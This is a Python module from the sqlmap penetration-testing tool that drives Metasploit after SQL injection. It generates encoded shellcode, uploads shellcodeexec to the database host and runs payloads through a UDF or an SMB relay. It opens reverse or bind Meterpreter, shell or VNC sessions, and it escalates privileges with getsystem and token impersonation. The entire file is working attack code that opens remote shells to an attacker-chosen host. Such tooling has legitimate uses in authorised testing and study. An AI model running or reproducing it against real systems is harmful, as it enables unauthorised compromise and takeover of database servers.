#!/usr/bin/env python

"""
Copyright (c) 2006-2012 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import codecs
import os
import re
import sys
import time

from select import select
from subprocess import PIPE
from subprocess import Popen as execute

from lib.core.common import dataToStdout
from lib.core.common import Backend
from lib.core.common import getLocalIP
from lib.core.common import getRemoteIP
from lib.core.common import getUnicode
from lib.core.common import normalizePath
from lib.core.common import ntToPosixSlashes
from lib.core.common import randomRange
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.data import conf
from lib.core.data import logger
from lib.core.data import paths
from lib.core.enums import DBMS
from lib.core.enums import OS
from lib.core.exception import SqlmapDataException
from lib.core.exception import SqlmapFilePathException
from lib.core.settings import IS_WIN
from lib.core.settings import UNICODE_ENCODING
from lib.core.subprocessng import blockingReadFromFD
from lib.core.subprocessng import blockingWriteToFD
from lib.core.subprocessng import pollProcess
from lib.core.subprocessng import setNonBlocking


class Metasploit:
    """
    This class defines methods to call Metasploit for plugins.
    """

    def _initVars(self):
        self.connectionStr = None
        self.lhostStr = None
        self.rhostStr = None
        self.portStr = None
        self.payloadStr = None
        self.encoderStr = None
        self.payloadConnStr = None
        self.localIP = getLocalIP()
        self.remoteIP = getRemoteIP()
        self._msfCli = normalizePath(os.path.join(conf.msfPath, "msfcli"))
        self._msfEncode = normalizePath(os.path.join(conf.msfPath, "msfencode"))
        self._msfPayload = normalizePath(os.path.join(conf.msfPath, "msfpayload"))

        if IS_WIN:
            _ = normalizePath(os.path.join(conf.msfPath, "..", "scripts", "setenv.bat"))
            self._msfCli = "%s & ruby %s" % (_, self._msfCli)
            self._msfEncode = "ruby %s" % self._msfEncode
            self._msfPayload = "%s & ruby %s" % (_, self._msfPayload)

        self._msfPayloadsList = {
                                      "windows": {
                                                   1: ( "Meterpreter (default)", "windows/meterpreter" ),
                                                   2: ( "Shell", "windows/shell" ),
                                                   3: ( "VNC", "windows/vncinject" ),
                                                 },
                                      "linux":   {
                                                   1: ( "Shell (default)", "linux/x86/shell" ),
                                                   2: ( "Meterpreter (beta)", "linux/x86/meterpreter" ),
                                                 }
                                    }

        self._msfConnectionsList = {
                                      "windows": {
                                                   1: ( "Reverse TCP: Connect back from the database host to this machine (default)", "reverse_tcp" ),
                                                   2: ( "Reverse TCP: Try to connect back from the database host to this machine, on all ports between the specified and 65535", "reverse_tcp_allports" ),
                                                   3: ( "Reverse HTTP: Connect back from the database host to this machine tunnelling traffic over HTTP", "reverse_http" ),
                                                   4: ( "Reverse HTTPS: Connect back from the database host to this machine tunnelling traffic over HTTPS", "reverse_https" ),
                                                   5: ( "Bind TCP: Listen on the database host for a connection", "bind_tcp" )
                                                 },
                                      "linux":   {
                                                   1: ( "Reverse TCP: Connect back from the database host to this machine (default)", "reverse_tcp" ),
                                                   2: ( "Bind TCP: Listen on the database host for a connection", "bind_tcp" ),
                                                 }
                                    }

        self._msfEncodersList = {
                                      "windows": {
                                                   1: ( "No Encoder", "generic/none" ),
                                                   2: ( "Alpha2 Alphanumeric Mixedcase Encoder", "x86/alpha_mixed" ),
                                                   3: ( "Alpha2 Alphanumeric Uppercase Encoder", "x86/alpha_upper" ),
                                                   4: ( "Avoid UTF8/tolower", "x86/avoid_utf8_tolower" ),
                                                   5: ( "Call+4 Dword XOR Encoder", "x86/call4_dword_xor" ),
                                                   6: ( "Single-byte XOR Countdown Encoder", "x86/countdown" ),
                                                   7: ( "Variable-length Fnstenv/mov Dword XOR Encoder", "x86/fnstenv_mov" ),
                                                   8: ( "Polymorphic Jump/Call XOR Additive Feedback Encoder", "x86/jmp_call_additive" ),
                                                   9: ( "Non-Alpha Encoder", "x86/nonalpha" ),
                                                  10: ( "Non-Upper Encoder", "x86/nonupper" ),
                                                  11: ( "Polymorphic XOR Additive Feedback Encoder (default)", "x86/shikata_ga_nai" ),
                                                  12: ( "Alpha2 Alphanumeric Unicode Mixedcase Encoder", "x86/unicode_mixed" ),
                                                  13: ( "Alpha2 Alphanumeric Unicode Uppercase Encoder", "x86/unicode_upper" ),
                                                 }
                                    }

        self._msfSMBPortsList = {
                                      "windows": {
                                                   1: ( "139/TCP", "139" ),
                                                   2: ( "445/TCP (default)", "445" ),
                                                 }
                                    }

        self._portData = {
                            "bind": "remote port number",
                            "reverse": "local port number",
                          }

    def _skeletonSelection(self, msg, lst=None, maxValue=1, default=1):
        if Backend.isOs(OS.WINDOWS):
            opSys = "windows"
        else:
            opSys = "linux"

        message = "which %s do you want to use?" % msg

        if lst:
            for num, data in lst[opSys].items():
                description = data[0]

                if num > maxValue:
                    maxValue = num

                if "(default)" in description:
                    default = num

                message += "\n[%d] %s" % (num, description)
        else:
            message += " [%d] " % default

        choice = readInput(message, default="%d" % default)

        if not choice:
            if lst:
                choice = getUnicode(default, UNICODE_ENCODING)
            else:
                return default

        elif not choice.isdigit():
            logger.warn("invalid value, only digits are allowed")
            return self._skeletonSelection(msg, lst, maxValue, default)

        elif int(choice) > maxValue or int(choice) < 1:
            logger.warn("invalid value, it must be a digit between 1 and %d" % maxValue)
            return self._skeletonSelection(msg, lst, maxValue, default)

        choice = int(choice)

        if lst:
            choice = lst[opSys][choice][1]

        return choice

    def _selectSMBPort(self):
        return self._skeletonSelection("SMB port", self._msfSMBPortsList)

    def _selectEncoder(self, encode=True):
        # This is always the case except for --os-bof where the user can
        # choose which encoder to use. When called from --os-pwn the encoder
        # is always x86/alpha_mixed - used for sys_bineval() and
        # shellcodeexec
        if isinstance(encode, basestring):
            return encode

        elif encode:
            return self._skeletonSelection("payload encoding", self._msfEncodersList)

    def _selectPayload(self):
        if Backend.isOs(OS.WINDOWS) and conf.privEsc:
            infoMsg = "forcing Metasploit payload to Meterpreter because "
            infoMsg += "it is the only payload that can be used to "
            infoMsg += "escalate privileges via 'incognito' extension, "
            infoMsg += "'getsystem' command or post modules"
            logger.info(infoMsg)

            _payloadStr = "windows/meterpreter"
        else:
            _payloadStr = self._skeletonSelection("payload", self._msfPayloadsList)

        if _payloadStr == "windows/vncinject":
            choose = False

            if Backend.isDbms(DBMS.MYSQL):
                debugMsg = "by default MySQL on Windows runs as SYSTEM "
                debugMsg += "user, it is likely that the the VNC "
                debugMsg += "injection will be successful"
                logger.debug(debugMsg)

            elif Backend.isDbms(DBMS.PGSQL):
                choose = True

                warnMsg = "by default PostgreSQL on Windows runs as "
                warnMsg += "postgres user, it is unlikely that the VNC "
                warnMsg += "injection will be successful"
                logger.warn(warnMsg)

            elif Backend.isDbms(DBMS.MSSQL) and Backend.isVersionWithin(("2005", "2008")):
                choose = True

                warnMsg = "it is unlikely that the VNC injection will be "
                warnMsg += "successful because usually Microsoft SQL Server "
                warnMsg += "%s runs as Network Service " % Backend.getVersion()
                warnMsg += "or the Administrator is not logged in"
                logger.warn(warnMsg)

            if choose:
                message = "what do you want to do?\n"
                message += "[1] Give it a try anyway\n"
                message += "[2] Fall back to Meterpreter payload (default)\n"
                message += "[3] Fall back to Shell payload"

                while True:
                    choice = readInput(message, default="2")

                    if not choice or choice == "2":
                        _payloadStr = "windows/meterpreter"

                        break

                    elif choice == "3":
                        _payloadStr = "windows/shell"

                        break

                    elif choice == "1":
                        if Backend.isDbms(DBMS.PGSQL):
                            logger.warn("beware that the VNC injection might not work")

                            break

                        elif Backend.isDbms(DBMS.MSSQL) and Backend.isVersionWithin(("2005", "2008")):
                            break

                    elif not choice.isdigit():
                        logger.warn("invalid value, only digits are allowed")

                    elif int(choice) < 1 or int(choice) > 2:
                        logger.warn("invalid value, it must be 1 or 2")

        if self.connectionStr.startswith("reverse_http") and _payloadStr != "windows/meterpreter":
            warnMsg = "Reverse HTTP%s connection is only supported " % ("S" if self.connectionStr.endswith("s") else "")
            warnMsg += "with the Meterpreter payload. Falling back to "
            warnMsg += "reverse TCP"
            logger.warn(warnMsg)

            self.connectionStr = "reverse_tcp"

        return _payloadStr

    def _selectPort(self):
        for connType, connStr in self._portData.items():
            if self.connectionStr.startswith(connType):
                return self._skeletonSelection(connStr, maxValue=65535, default=randomRange(1025, 65535))

    def _selectRhost(self):
        if self.connectionStr.startswith("bind"):
            message = "what is the back-end DBMS address? [%s] " % self.remoteIP
            address = readInput(message, default=self.remoteIP)

            if not address:
                address = self.remoteIP

            return address

        elif self.connectionStr.startswith("reverse"):
            return None

        else:
            raise SqlmapDataException, "unexpected connection type"

    def _selectLhost(self):
        if self.connectionStr.startswith("reverse"):
            message = "what is the local address? [%s] " % self.localIP
            address = readInput(message, default=self.localIP)

            if not address:
                address = self.localIP

            return address

        elif self.connectionStr.startswith("bind"):
            return None

        else:
            raise SqlmapDataException, "unexpected connection type"

    def _selectConnection(self):
        return self._skeletonSelection("connection type", self._msfConnectionsList)

    def _prepareIngredients(self, encode=True):
        self.connectionStr = self._selectConnection()
        self.lhostStr = self._selectLhost()
        self.rhostStr = self._selectRhost()
        self.portStr = self._selectPort()
        self.payloadStr = self._selectPayload()
        self.encoderStr = self._selectEncoder(encode)
        self.payloadConnStr = "%s/%s" % (self.payloadStr, self.connectionStr)

    def _forgeMsfCliCmd(self, exitfunc="process"):
        self._cliCmd = "%s multi/handler PAYLOAD=%s" % (self._msfCli, self.payloadConnStr)
        self._cliCmd += " EXITFUNC=%s" % exitfunc
        self._cliCmd += " LPORT=%s" % self.portStr

        if self.connectionStr.startswith("bind"):
            self._cliCmd += " RHOST=%s" % self.rhostStr
        elif self.connectionStr.startswith("reverse"):
            self._cliCmd += " LHOST=%s" % self.lhostStr
        else:
            raise SqlmapDataException, "unexpected connection type"

        if Backend.isOs(OS.WINDOWS) and self.payloadStr == "windows/vncinject":
            self._cliCmd += " DisableCourtesyShell=true"

        self._cliCmd += " E"

    def _forgeMsfCliCmdForSmbrelay(self):
        self._prepareIngredients(encode=False)

        self._cliCmd = "%s windows/smb/smb_relay PAYLOAD=%s" % (self._msfCli, self.payloadConnStr)
        self._cliCmd += " EXITFUNC=thread"
        self._cliCmd += " LPORT=%s" % self.portStr
        self._cliCmd += " SRVHOST=%s" % self.lhostStr
        self._cliCmd += " SRVPORT=%s" % self._selectSMBPort()

        if self.connectionStr.startswith("bind"):
            self._cliCmd += " RHOST=%s" % self.rhostStr
        elif self.connectionStr.startswith("reverse"):
            self._cliCmd += " LHOST=%s" % self.lhostStr
        else:
            raise SqlmapDataException, "unexpected connection type"

        self._cliCmd += " E"

    def _forgeMsfPayloadCmd(self, exitfunc, format, outFile, extra=None):
        self._payloadCmd = "%s %s" % (self._msfPayload, self.payloadConnStr)
        self._payloadCmd += " EXITFUNC=%s" % exitfunc
        self._payloadCmd += " LPORT=%s" % self.portStr

        if self.connectionStr.startswith("reverse"):
            self._payloadCmd += " LHOST=%s" % self.lhostStr
        elif not self.connectionStr.startswith("bind"):
            raise SqlmapDataException, "unexpected connection type"

        if Backend.isOs(OS.LINUX) and conf.privEsc:
            self._payloadCmd += " PrependChrootBreak=true PrependSetuid=true"

        if extra == "BufferRegister=EAX":
            self._payloadCmd += " R | %s -a x86 -e %s -o \"%s\" -t %s" % (self._msfEncode, self.encoderStr, outFile, format)

            if extra is not None:
                self._payloadCmd += " %s" % extra
        else:
            self._payloadCmd += " X > \"%s\"" % outFile

    def _runMsfCliSmbrelay(self):
        self._forgeMsfCliCmdForSmbrelay()

        infoMsg = "running Metasploit Framework command line "
        infoMsg += "interface locally, please wait.."
        logger.info(infoMsg)

        logger.debug("executing local command: %s" % self._cliCmd)
        self._msfCliProc = execute(self._cliCmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)

    def _runMsfCli(self, exitfunc):
        self._forgeMsfCliCmd(exitfunc)

        infoMsg = "running Metasploit Framework command line "
        infoMsg += "interface locally, please wait.."
        logger.info(infoMsg)

        logger.debug("executing local command: %s" % self._cliCmd)
        self._msfCliProc = execute(self._cliCmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)

    def _runMsfShellcodeRemote(self):
        infoMsg = "running Metasploit Framework shellcode "
        infoMsg += "remotely via UDF 'sys_bineval', please wait.."
        logger.info(infoMsg)

        self.udfExecCmd("'%s'" % self.shellcodeString, silent=True, udfName="sys_bineval")

    def _runMsfShellcodeRemoteViaSexec(self):
        infoMsg = "running Metasploit Framework shellcode remotely "
        infoMsg += "via shellcodeexec, please wait.."
        logger.info(infoMsg)

        if not Backend.isOs(OS.WINDOWS):
            self.execCmd("chmod +x %s" % self.shellcodeexecRemote, silent=True)
            cmd = "%s %s &" % (self.shellcodeexecRemote, self.shellcodeString)
        else:
            cmd = "\"%s\" %s" % (self.shellcodeexecRemote, self.shellcodeString)

        self.execCmd(cmd, silent=True)

    def _loadMetExtensions(self, proc, metSess):
        if not Backend.isOs(OS.WINDOWS):
            return

        proc.stdin.write("use espia\n")
        proc.stdin.write("use incognito\n")
        # This extension is loaded by default since Metasploit > 3.7
        #proc.stdin.write("use priv\n")
        # This extension freezes the connection on 64-bit systems
        #proc.stdin.write("use sniffer\n")
        proc.stdin.write("sysinfo\n")
        proc.stdin.write("getuid\n")

        if conf.privEsc:
            print

            infoMsg = "trying to escalate privileges using Meterpreter "
            infoMsg += "'getsystem' command which tries different "
            infoMsg += "techniques, including kitrap0d"
            logger.info(infoMsg)

            proc.stdin.write("getsystem\n")

            infoMsg = "displaying the list of Access Tokens availables. "
            infoMsg += "Choose which user you want to impersonate by "
            infoMsg += "using incognito's command 'impersonate_token' if "
            infoMsg += "'getsystem' does not success to elevate privileges"
            logger.info(infoMsg)

            proc.stdin.write("list_tokens -u\n")
            proc.stdin.write("getuid\n")

    def _controlMsfCmd(self, proc, func):
        stdin_fd = sys.stdin.fileno()
        setNonBlocking(stdin_fd)

        proc_out_fd = proc.stdout.fileno()
        setNonBlocking(proc_out_fd)

        while True:
            returncode = proc.poll()

            if returncode is None:
                # Child hasn't exited yet
                pass
            else:
                logger.debug("connection closed properly")
                return returncode

            try:
                ready_fds = select([stdin_fd, proc_out_fd], [], [], 1)

                if stdin_fd in ready_fds[0]:
                    try:
                        proc.stdin.write(blockingReadFromFD(stdin_fd))
                    except IOError:
                        # Probably the child has exited
                        pass

                if proc_out_fd in ready_fds[0]:
                    out = blockingReadFromFD(proc_out_fd)
                    blockingWriteToFD(sys.stdout.fileno(), out)

                    # For --os-pwn and --os-bof
                    pwnBofCond = self.connectionStr.startswith("reverse")
                    pwnBofCond &= "Starting the payload handler" in out

                    # For --os-smbrelay
                    smbRelayCond = "Server started" in out

                    if pwnBofCond or smbRelayCond:
                        func()

                    if "Starting the payload handler" in out and "shell" in self.payloadStr:
                        if Backend.isOs(OS.WINDOWS):
                            proc.stdin.write("whoami\n")
                        else:
                            proc.stdin.write("uname -a ; id\n")

                    metSess = re.search("Meterpreter session ([\d]+) opened", out)

                    if metSess:
                        self._loadMetExtensions(proc, metSess.group(1))

            except EOFError:
                returncode = proc.wait()

                return returncode

    def createMsfShellcode(self, exitfunc, format, extra, encode):
        infoMsg = "creating Metasploit Framework multi-stage shellcode "
        logger.info(infoMsg)

        self._randStr = randomStr(lowercase=True)
        self._shellcodeFilePath = os.path.join(conf.outputPath, "tmpm%s" % self._randStr)

        self._initVars()
        self._prepareIngredients(encode=encode)
        self._forgeMsfPayloadCmd(exitfunc, format, self._shellcodeFilePath, extra)

        logger.debug("executing local command: %s" % self._payloadCmd)
        process = execute(self._payloadCmd, shell=True, stdout=None, stderr=PIPE)

        dataToStdout("\r[%s] [INFO] creation in progress " % time.strftime("%X"))
        pollProcess(process)
        payloadStderr = process.communicate()[1]

        if Backend.isOs(OS.WINDOWS) or extra == "BufferRegister=EAX":
            payloadSize = re.search("size ([\d]+)", payloadStderr, re.I)
        else:
            payloadSize = re.search("Length\:\s([\d]+)", payloadStderr, re.I)

        if payloadSize:
            payloadSize = int(payloadSize.group(1))

            if extra == "BufferRegister=EAX":
                payloadSize = payloadSize / 2

            debugMsg = "the shellcode size is %d bytes" % payloadSize
            logger.debug(debugMsg)
        else:
            errMsg = "failed to create the shellcode (%s)" % payloadStderr.replace("\n", " ").replace("\r", "")
            raise SqlmapFilePathException, errMsg

        self._shellcodeFP = codecs.open(self._shellcodeFilePath, "rb")
        self.shellcodeString = self._shellcodeFP.read()
        self._shellcodeFP.close()

        os.unlink(self._shellcodeFilePath)

    def uploadShellcodeexec(self, web=False):
        self.shellcodeexecLocal = paths.SQLMAP_SEXEC_PATH

        if Backend.isOs(OS.WINDOWS):
            self.shellcodeexecLocal += "/windows/shellcodeexec.x%s.exe" % "32"
        else:
            self.shellcodeexecLocal += "/linux/shellcodeexec.x%s" % Backend.getArch()

        # TODO: until web.py's __webFileStreamUpload() method does not consider the destFileName
        #__basename = "tmpse%s%s" % (self._randStr, ".exe" if Backend.isOs(OS.WINDOWS) else "")
        __basename = os.path.basename(self.shellcodeexecLocal)

        if web:
            self.shellcodeexecRemote = "%s/%s" % (self.webDirectory, __basename)
        else:
            self.shellcodeexecRemote = "%s/%s" % (conf.tmpPath, __basename)

        self.shellcodeexecRemote = ntToPosixSlashes(normalizePath(self.shellcodeexecRemote))

        logger.info("uploading shellcodeexec to '%s'" % self.shellcodeexecRemote)

        if web:
            self.webFileUpload(self.shellcodeexecLocal, self.shellcodeexecRemote, self.webDirectory)
        else:
            self.writeFile(self.shellcodeexecLocal, self.shellcodeexecRemote, "binary")

    def pwn(self, goUdf=False):
        if goUdf:
            exitfunc = "thread"
            func = self._runMsfShellcodeRemote
        else:
            exitfunc = "process"
            func = self._runMsfShellcodeRemoteViaSexec

        self._runMsfCli(exitfunc=exitfunc)

        if self.connectionStr.startswith("bind"):
            func()

        debugMsg = "Metasploit Framework command line interface exited "
        debugMsg += "with return code %s" % self._controlMsfCmd(self._msfCliProc, func)
        logger.debug(debugMsg)

        if not goUdf:
            time.sleep(1)
            self.delRemoteFile(self.shellcodeexecRemote)

    def smb(self):
        self._initVars()
        self._randFile = "tmpu%s.txt" % randomStr(lowercase=True)

        self._runMsfCliSmbrelay()

        if Backend.getIdentifiedDbms() in ( DBMS.MYSQL, DBMS.PGSQL ):
            self.uncPath = "\\\\\\\\%s\\\\%s" % (self.lhostStr, self._randFile)
        else:
            self.uncPath = "\\\\%s\\%s" % (self.lhostStr, self._randFile)

        debugMsg = "Metasploit Framework console exited with return "
        debugMsg += "code %s" % self._controlMsfCmd(self._msfCliProc, self.uncPathRequest)
        logger.debug(debugMsg)

    def bof(self):
        self._runMsfCli(exitfunc="seh")

        if self.connectionStr.startswith("bind"):
            self.spHeapOverflow()

        debugMsg = "Metasploit Framework command line interface exited "
        debugMsg += "with return code %s" % self._controlMsfCmd(self._msfCliProc, self.spHeapOverflow)
        logger.debug(debugMsg)
